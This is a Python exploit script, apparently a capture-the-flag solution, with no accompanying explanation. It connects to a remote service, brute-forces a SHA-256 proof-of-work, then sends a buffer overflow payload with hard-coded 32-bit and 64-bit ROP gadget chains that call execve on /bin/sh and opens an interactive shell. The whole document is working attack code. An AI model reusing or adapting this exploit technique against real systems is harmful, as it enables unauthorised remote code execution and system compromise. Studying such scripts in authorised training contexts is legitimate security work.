import hashlib,sys,socket,re
from struct import pack
from pwn import *
from struct import pack

r = remote('49.4.51.149',25391)
r.recv()
data=r.recv()
print data
skr_sha256 = re.findall('hashlib.sha256\(skr\).hexdigest\(\)=(.*?)\n', data)[0]
skr = re.findall('skr\[0:5\].encode\(\'hex\'\)=(.*?)\n', data)[0].decode('hex')

while True:
    for i in range(255, 1, -1):
        for j in range(255, 1, -1):
            for k in range(255, 1, -1):
                temp = skr + chr(i) + chr(j) + chr(k)
                _sha256 = hashlib.new('sha256')
                _sha256.update(temp)
                if _sha256.hexdigest() == skr_sha256:
                    print temp.encode('hex'),i,j,k
                    r.send(temp.encode('hex')+'\r\n')
                    print r.recv(1024)
                    r.sendline("4c69fe806a9daf27c4a5f301e0dc41ef")
                    int_0x80_addr = 0x080495a3
                    bss = 0x080DAFC4
                    pop_dx_cx_bx_ret = 0x0806e9f1
                    pop_edi_ret=0x08049b1b
                    pop_rax_ret = 0x080a8af6
                    read=0x0806C8E0
                    syscall = 0x0000000000461645
                    bss_64_addr = 0x6a4e40
                    pop_rdi_64_ret = 0x4005f6
                    pop_rsi_64_ret = 0x405895
                    pop_rdx_64_ret = 0x43b9d5
                    pop_rax_64_ret = 0x43b97c
                    add_64_80sp_ret = 0x40cd17
                    add_32_20sp_ret = 0x080a69f2
                    pay='A'*0x110
                    pay+=p32(add_32_20sp_ret)
                    pay+='A'*4
                    pay+=p64(add_64_80sp_ret)
                    pay+='A'*0x14
                    pay+=p32(read) 
                    pay+=p32(pop_dx_cx_bx_ret) 
                    pay+=p32(0) 
                    pay+=p32(bss) 
                    pay+=p32(0x8)  
                    pay+=p32(pop_rax_ret) 
                    pay+=p32(0xb) 
                    pay+=p32(pop_dx_cx_bx_ret) 
                    pay+=p32(0)  
                    pay+=p32(0) 
                    pay+=p32(bss)
                    pay+=p32(int_0x80_addr)
                    pay+='A'*0x3c
                    pay+=p64(pop_rdi_64_ret) 
                    pay+=p64(0x0) 
                    pay+=p64(pop_rsi_64_ret) 
                    pay+=p64(bss_64_addr) 
                    pay+=p64(pop_rdx_64_ret) 
                    pay+=p64(0x20) 
                    pay+=p64(pop_rax_64_ret) 
                    pay+=p64(0) 
                    pay+=p64(syscall) 
                    pay+=p64(pop_rax_64_ret) 
                    pay+=p64(0) 
                    pay+=p64(pop_rsi_64_ret) 
                    pay+=p64(0x0) 
                    pay+=p64(pop_rdx_64_ret) 
                    pay+=p64(0x0) 
                    pay+=p64(pop_rax_64_ret) 
                    pay+=p64(59) 
                    pay+=p64(pop_rdi_64_ret) 
                    pay+=p64(bss_64_addr) 
                    pay+=p64(syscall)
                    sleep(2)
                    print r.recv()
                    r.send(pay) 
                    sleep(2)
                    print r.recv()
                    r.sendline('/bin/sh\x00')
                    r.interactive()